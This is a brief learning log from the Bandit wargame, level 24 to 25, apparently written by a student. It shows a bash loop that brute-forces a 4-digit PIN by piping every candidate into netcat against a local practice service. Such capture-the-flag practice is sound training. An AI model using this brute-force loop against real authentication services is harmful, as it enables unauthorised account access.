# Bandit Level 24 → Level 25

## What I did
I brute-forced a 4-digit PIN using netcat to retrieve the password.

## Commands I used
for i in {0000..9999}; do
  echo "password $i"
done | nc localhost 30002

## Result
I got the password for Level 25.

## What I learned
- Brute-forcing numeric passwords
- Using loops with netcat
